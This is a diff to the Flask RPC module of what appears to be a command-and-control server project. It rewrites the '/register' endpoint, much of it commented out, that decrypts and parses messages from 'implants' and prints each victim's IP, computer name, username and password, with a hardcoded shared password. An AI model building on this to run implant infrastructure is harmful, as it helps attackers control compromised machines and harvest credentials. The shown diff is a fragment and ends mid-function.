@@ -7,6 +7,7 @@ from cvnt.implant_pb2 import *
 from flask_wtf.csrf import * # type: ignore
 
 from cvnt.db_operations import *
+import base64
 
 from cvnt.constants import *
 from nacl.public import PrivateKey, Box
@@ -19,51 +20,54 @@ rpc = Blueprint("rpc", __name__)
 PASSWORD = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"
 
 # Load the server's private key from a file
-def load_private_key():
-    with open('/home/ubuntu/BinaryBaddies/cvnt/cvnt/server_private_key.txt', 'rb') as key_file:
-        private_key_hex = key_file.read().strip()
-        return PrivateKey(private_key_hex)
+# def load_private_key():
+#     with open('/home/ubuntu/BinaryBaddies/cvnt/cvnt/server_private_key.txt', 'rb') as key_file:
+#         private_key_hex = key_file.read().strip()
+#         return PrivateKey(private_key_hex)
 
-server_private_key = load_private_key()
-print(server_private_key, "server private key")
+# server_private_key = load_private_key()
+# print(server_private_key, "server private key")
 
-@rpc.route("/register", methods=["POST"])
-
-# # def handle_register():
+@rpc.route('/register', methods=['POST'])
 def handle_register():
-#     ip = request.remote_addr
-#     encrypted_message = request.data
-#     print(encrypted_message, "here")
+    # ip = request.remote_addr
+    # base64_encrypted_message = request.data
+    # print(base64_encrypted_message, "data received on server")
 
-#     try:
-#         # Create a box with only the server's private key (since we use SealedBox for single key encryption)
-#         box = Box(server_private_key, server_private_key.public_key)
+    # try:
+    #     # Decode the Base64 encoded data
+    #     encrypted_message = base64.b64decode(base64_encrypted_message)
+    #     print(encrypted_message, "b64 decoded encrypted message")
 
-#         # Decrypt the message
-#         decrypted_message = box.decrypt(encrypted_message)
+    #     # Create a box with only the server's private key (since we use SealedBox for single key encryption)
+    #     box = Box(server_private_key, server_private_key.public_key)
 
-#         # Parse the decrypted message using protobuf
-#         register = RegisterImplant()
-#         register.ParseFromString(decrypted_message)
+    #     # Decrypt the message
+    #     decrypted_message = box.decrypt(encrypted_message)
 
-#         print(f'[+] New Implant: from {ip}')
-#         print(f'[+]    * ImplantID: {register.ImplantID}')
-#         print(f'[+]    * ComputerName: {register.ComputerName}')
-#         print(f'[+]    * Public Key: {register.PublicKey}')
-#         print(f'[+]    * Username: {register.Username}')
-#         print(f'[+]    * Password: {register.Password}')
+    #     # Parse the decrypted message using protobuf
+    #     register = RegisterImplant()
+    #     register.ParseFromString(decrypted_message)
 
-#         if register.Password != PASSWORD:
-#             abort(404)
+    #     print(f'[+] New Implant: from {ip}')
+    #     print(f'[+]    * ImplantID: {register.ImplantID}')
+    #     print(f'[+]    * ComputerName: {register.ComputerName}')
+    #     print(f'[+]    * Public Key: {register.PublicKey}')
+    #     print(f'[+]    * Username: {register.Username}')
+    #     print(f'[+]    * Password: {register.Password}')
 
-#         r = register_implant(make_implant(register, ip))
+    #     if register.Password != PASSWORD:
+    #         abort(404)
 
-#         print("[+] Watch out sexy ;) a New Implant connected!")
+    #     # Here you would normally store the implant's information in the database
+    #     r = register_implant(make_implant(register, ip))
 
-#         #return Response("Successfully registered", status=200)
-#     except Exception as e:
-#         print(f"Error during registration: {str(e)}")
-#         #return Response("Registration failed", status=500)
+    #     print("[+] Watch out sexy ;) a New Implant connected!")
+
+    #     return Response("Successfully registered", status=200)
+    # except Exception as e:
+    #     print(f"Error during registration: {str(e)}")
+    #     return Response("Registration failed", status=500)
 
     ip = request.remote_addr
     reg_data = request.get_data()
